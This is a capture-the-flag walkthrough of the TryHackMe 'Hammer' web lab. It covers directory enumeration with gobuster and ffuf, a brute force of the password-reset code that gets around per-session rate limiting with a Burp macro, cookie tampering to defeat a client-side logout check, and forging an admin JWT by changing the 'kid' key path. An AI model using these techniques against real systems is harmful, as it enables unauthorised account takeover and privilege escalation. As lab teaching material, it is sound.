---
layout: post
title: TryHackMe - Hammer
date: 2025-12-23 12:11 +0000
tags: [tryhackme, web-pentesting]
category: [TryHackMe - Walkthroughs]
media_subpath: /assets/img/hammer/
---
Hammer is the final room in the Authentication path for Web Application Pentesting. 

## Recon

We are provided very little info so first lets do a nmap scan:
```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-23 07:13 EST
Nmap scan report for 10.81.133.125
Host is up (0.022s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:7c:4f:c5:73:78:e6:c8:9e:0b:92:18:35:f2:e1:57 (RSA)
|   256 c1:3b:18:f3:ed:5e:b1:86:bf:59:78:fb:10:72:ca:32 (ECDSA)
|_  256 0a:16:ed:0c:01:23:3d:8e:4c:90:1d:fd:b3:36:d4:66 (ED25519)
1337/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Login
|_http-server-header: Apache/2.4.41 (Ubuntu)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

When we browse to the webpage on port 1337 we are greeted with a simple login prompt with a Forgot password link

Off the bat this forgot password page could be used to find email addresses as it provides an error when you enter an incorrect email. 

![reset-password-flaw](reset_password_flaw.png)
_Password Reset Flaw_

However it does have a rate limit so we can't bruteforce it. 

### Gobuster

Lets do some further recon with gobuster and see what we can find
```bash
gobuster dir -u http://TARGET_IP:1337 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```bash
/javascript           (Status: 301) [Size: 326] [--> http://10.81.133.125:1337/javascript/]
/vendor               (Status: 301) [Size: 322] [--> http://10.81.133.125:1337/vendor/]
/phpmyadmin           (Status: 301) [Size: 326] [--> http://10.81.133.125:1337/phpmyadmin/]
```

First interesting directory is /vendor here we can find the composer directory exposed, this lets us see what version of libraries are being used. 

![vendor-dir](vendor_dir.png)
_Vendor Directory with composer.json_

We also have a phpmyadmin endpoint - these are commonly misconfigured and lack updates. 
If we browse to the **/doc** page we can find out the version:

![php-my-admin](phpmyadmin.png)
_phpmyadmin version 4.9.5_

None of these are unfortunately giving up info around a login though so lets do some further digging. Viewing the source of the login page we can see this leftover comment:
```html
<link href="/hmr_css/bootstrap.min.css" rel="stylesheet">
	<!-- Dev Note: Directory naming convention must be hmr_DIRECTORY_NAME -->
```

Lets use this prefix to enumerate, annonyingly Gobuster doesnt support prefixes so we will use ffuf
```bash
└─$ ffuf -u http://10.81.133.125:1337/hmr_FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.81.133.125:1337/hmr_FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

images                  [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 25ms]
css                     [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 24ms]
js                      [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 25ms]
logs                    [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 25ms]
:: Progress: [220560/220560] :: Job [1/1] :: 1694 req/sec :: Duration: [0:02:27] :: Errors: 0 ::
```

Ahh an logs folder, inside we find **error.logs** 

```
[Mon Aug 19 12:00:01.123456 2024] [core:error] [pid 12345:tid 139999999999999] [client 192.168.1.10:56832] AH00124: Request exceeded the limit of 10 internal redirects due to probable configuration error. Use 'LimitInternalRecursion' to increase the limit if necessary. Use 'LogLevel debug' to get a backtrace.
[Mon Aug 19 12:01:22.987654 2024] [authz_core:error] [pid 12346:tid 139999999999998] [client 192.168.1.15:45918] AH01630: client denied by server configuration: /var/www/html/
[Mon Aug 19 12:02:34.876543 2024] [authz_core:error] [pid 12347:tid 139999999999997] [client 192.168.1.12:37210] AH01631: user tester@hammer.thm: authentication failure for "/restricted-area": Password Mismatch
[Mon Aug 19 12:03:45.765432 2024] [authz_core:error] [pid 12348:tid 139999999999996] [client 192.168.1.20:37254] AH01627: client denied by server configuration: /etc/shadow
[Mon Aug 19 12:04:56.654321 2024] [core:error] [pid 12349:tid 139999999999995] [client 192.168.1.22:38100] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/protected
[Mon Aug 19 12:05:07.543210 2024] [authz_core:error] [pid 12350:tid 139999999999994] [client 192.168.1.25:46234] AH01627: client denied by server configuration: /home/hammerthm/test.php
[Mon Aug 19 12:06:18.432109 2024] [authz_core:error] [pid 12351:tid 139999999999993] [client 192.168.1.30:40232] AH01617: user tester@hammer.thm: authentication failure for "/admin-login": Invalid email address
[Mon Aug 19 12:07:29.321098 2024] [core:error] [pid 12352:tid 139999999999992] [client 192.168.1.35:42310] AH00124: Request exceeded the limit of 10 internal redirects due to probable configuration error. Use 'LimitInternalRecursion' to increase the limit if necessary. Use 'LogLevel debug' to get a backtrace.
[Mon Aug 19 12:09:51.109876 2024] [core:error] [pid 12354:tid 139999999999990] [client 192.168.1.50:45998] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/locked-down
```

## Authentication Bypass

So we have our email tester@hammer.thm, now we need to either find a password or bruteforce the Password Reset flow. From some initial testing on the login form it has rate limiting, this rate limiting is applied on the password reset flow too but it seems to be tied to the SessionId and we get 8 tries before it locks us out.

So to bruteforce the password reset we would need to get lucky in guessing it in 8 tries assuming the code is random each time we request a reset. 

Lets try because I cant think of anything else at the moment.

### Password Reset Bruteforce
The flow to get around the rate limiting is quite simple:

Grab a SessionId -> Start Password reset for tester@hammer.thm -> Try a code

Luckily we can do the first 2 in the same request. In burpsuite I created a Session handling rule which runs a macro. The macro does the POST request to /reset_password.php with the tester@hammer.thm email, the response provides a new session via the Set-Cookie header and then we can run a simple Sniper attack for the reset code. 

![sessionrules](sessionrule.png)
_Session Handling rule & Macro_

After a while I had a successful attempt:

![successfulcode](successfulcode.png)
_A successful code of 1083_

I can now swap in the Session cookie from this successful request and reset the password. Now we can login.

## Remote Code Execution

The dashboard! This will let us run commands.

![dashboard](dashboard.png)
_Dashboard with Command Runner_

### Short Session

It was so short lived. I got kicked back to the login page. Upon logging in this time I checked and noticed 2 new cookies **persistentSession** set to no and a new **token** cookie which we will come back to. There also has to be some javascript checking that cookie and kicking us out, lo and behold:

```js
<script>
       
        function getCookie(name) {
            const value = `; ${document.cookie}`;
            const parts = value.split(`; ${name}=`);
            if (parts.length === 2) return parts.pop().split(';').shift();
        }

      
        function checkTrailUserCookie() {
            const trailUser = getCookie('persistentSession');
            if (!trailUser) {
          
                window.location.href = 'logout.php';
            }
        }

       
        setInterval(checkTrailUserCookie, 1000); 
    </script>
```

So I set my **persistentSession** cookie to yes and also extended the expiration by a few hours as it was quite short. This stopped me getting kicked out. 

### JWT

I tried a good few commands and it seems I can only run **ls** however this does reveal a key called **188ade1.key** in the current directory. Browsing to it and its downloadable.

So now we have a key and we need to find a way to get out of this restricted command runner. 

The other new cookie we mentioned **token** is a JWT, lets decode it to see what it hides:

```js
Header:
{
  "typ": "JWT",
  "alg": "HS256",
  "kid": "/var/www/mykey.key"
}
Payload:
{
  "iss": "http://hammer.thm",
  "aud": "http://hammer.thm",
  "iat": 1766519668,
  "exp": 1766523268,
  "data": {
    "user_id": 1,
    "email": "tester@hammer.thm",
    "role": "user"
  }
}
```

So this reveals that the JWT we get sent is being signed with a different key and using the downloaded key it doesnt verify this JWT so both keys are different. 

I wonder if we create a new JWT with the same structure, set our role to admin but then change the header kid value to point to this other key?
```js
Header:
{
  "typ": "JWT",
  "alg": "HS256",
  "kid": "/var/www/html/188ade1.key"
}
Payload:
{
  "iss": "http://hammer.thm",
  "aud": "http://hammer.thm",
  "iat": 1766519668,
  "exp": 1766523268,
  "data": {
    "user_id": 1,
    "email": "tester@hammer.thm",
    "role": "admin"
  }
}
```

Success! The server is lacking verification of the *kid* before verifiying the JWT.

![success](success.png)
_Successful whoami_

Even better I can now **cat** the flag in **/home/ubuntu/flag.txt**!

![final-flag](finalflag.png)
_Final flag_